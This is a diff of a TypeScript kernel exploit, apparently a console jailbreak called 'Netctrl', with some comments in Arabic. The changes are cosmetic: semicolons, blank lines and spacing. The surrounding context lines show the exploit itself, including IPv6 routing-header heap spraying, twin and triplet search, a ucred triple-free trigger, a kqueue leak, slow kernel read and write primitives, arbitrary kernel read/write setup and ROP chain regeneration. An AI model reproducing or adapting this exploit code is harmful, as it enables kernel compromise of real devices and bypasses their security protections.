@@ -3,15 +3,14 @@ import { libc_addr } from 'download0/userland'
 import { get_fwversion, hex, malloc, read16, read32, read64, send_notification, write16, write32, write64, write8, get_kernel_offset, kernel, jailbreak_shared, read8 } from 'download0/kernel'
 import { show_success, run_binloader } from 'download0/loader'
 
-
 // include('userland.js')
 
 if (typeof libc_addr === 'undefined') {
-  include('userland.js');
+  include('userland.js')
 }
-include('kernel.js');
-include('stats-tracker.js');
-include('binloader.js');
+include('kernel.js')
+include('stats-tracker.js')
+include('binloader.js')
 if (!String.prototype.padStart) {
   String.prototype.padStart = function padStart (targetLength, padString) {
     targetLength = targetLength >> 0 // truncate if number or convert non-number to 0
@@ -168,9 +167,9 @@ const MAX_WORKER_RESETS = 3
 let current_core = MAIN_CORE   // 4 عندك
 const CORE_LIST = [4, 3, 5]    // cores بديلة
 
-const MAX_LEAKKQ_FAIL   = 3      // بعدهم نعلن فشل نهائي
-const MAX_KREAD_FAIL    = 2      // عدد محاولات kreadslow قبل ما نرجع false
-const MAX_KWRITE_FAIL   = 2      // عدد محاولات kwriteslow قبل ما نرجع false
+const MAX_LEAKKQ_FAIL = 3      // بعدهم نعلن فشل نهائي
+const MAX_KREAD_FAIL = 2      // عدد محاولات kreadslow قبل ما نرجع false
+const MAX_KWRITE_FAIL = 2      // عدد محاولات kwriteslow قبل ما نرجع false
 
 /***************************/
 /*      Used constiables     */
@@ -858,7 +857,6 @@ function find_twins () {
   const MAX_TWINS = MAX_ROUNDS_TWIN * 3   // زيادة 3x لتحسين الاستقرار
 
   while (count < MAX_TWINS) {
-
     // حماية من memory exhaustion
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount++
@@ -916,7 +914,6 @@ function find_triplet (master: number, other: number, iterations?: number) {
   const leak_add = leak_rthdr.add(0x04)
 
   while (count < iterations) {
-
     // prespray إضافي كل 50 محاولة
     if (count % 50 === 0) {
       prespray_ipv6()
@@ -938,7 +935,6 @@ function find_triplet (master: number, other: number, iterations?: number) {
     if ((val & 0xFFFF0000) === RTHDR_TAG &&
         j !== master &&
         j !== other) {
-
       log('[triplet] Found triplet: [' + j + ']')
       return j
     }
@@ -1063,7 +1059,6 @@ function exploit_phase_setup () {
   yield_to_render(exploit_phase_trigger)
 }
 
-
 function exploit_phase_trigger () {
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
     const msg = 'Netctrl failed - Reboot and try again'
@@ -1090,7 +1085,6 @@ function exploit_phase_trigger () {
   log('Leaking kqueue...')
   yield_to_render(exploit_phase_leak)
 }
-
 
 function validate_triplets (): boolean {
   log('Validating triplets...')
@@ -1134,7 +1128,6 @@ function exploit_phase_leak () {
   log('Setting up arbitrary R/W...')
   yield_to_render(exploit_phase_rw)
 }
-
 
 function setup_arbitrary_rw () {
   log('[arw] Setting up arbitrary R/W...')
@@ -1218,7 +1211,6 @@ function setup_arbitrary_rw () {
   log('[arw] Arbitrary R/W achieved successfully')
   debug('[arw] victim_r_pipe_file value: ' + hex(kread64(victim_r_pipe_file)))
 }
-
 
 function find_allproc () {
   // Use existing master_pipe instead of creating new one
@@ -1561,7 +1553,6 @@ function trigger_ucred_triplefree () {
   return true
 }
 
-
 function leak_kqueue () {
   log('[leak_kqueue] starting...')
 
@@ -1643,7 +1634,6 @@ function leak_kqueue () {
   return true
 }
 
-
 function leak_kqueue_safe () {
   try {
     const ok = leak_kqueue()
@@ -1659,14 +1649,12 @@ function leak_kqueue_safe () {
     }
 
     return ok
-
   } catch (e) {
     log('[leak_kqueue_safe] ERROR: ' + (e as Error).message)
     leak_kqueue_failures++
     return false
   }
 }
-
 
 function reset_workers () {
   worker_resets++
@@ -1702,7 +1690,6 @@ function kreadslow64 (address: BigInt) {
 
 function kreadslow64_safe (address: BigInt): BigInt {
   for (let attempt = 1; attempt <= MAX_KREAD_FAIL; attempt++) {
-
     if (debugging.info.memory.available === 0) {
       log('[kreadslow_safe] memory exhausted, delaying...')
       nanosleep_fun(5_000_000)
@@ -1865,7 +1852,6 @@ function kreadslow (addr: BigInt, size: number) {
   return leak_buffer
 }
 
-
 function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
   debug('[kwriteslow] addr=' + hex(addr) + ' size=' + size)
 
@@ -1939,11 +1925,8 @@ function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
   return new BigInt(0)
 }
 
-
-
 function kwriteslow_safe (addr: BigInt, buffer: BigInt, size: number): BigInt {
   for (let attempt = 1; attempt <= MAX_KWRITE_FAIL; attempt++) {
-
     if (debugging.info.memory.available === 0) {
       log('[kwriteslow_safe] memory exhausted, delaying...')
       nanosleep_fun(5_000_000)
@@ -1978,7 +1961,6 @@ function kwriteslow_safe (addr: BigInt, buffer: BigInt, size: number): BigInt {
   cleanup()
   throw new Error('Netctrl failed - Reboot and try again')
 }
-
 
 function rop_regen_and_loop (last_rop_entry: BigInt, number_entries: number) {
   let new_rop_entry = last_rop_entry.add(8)
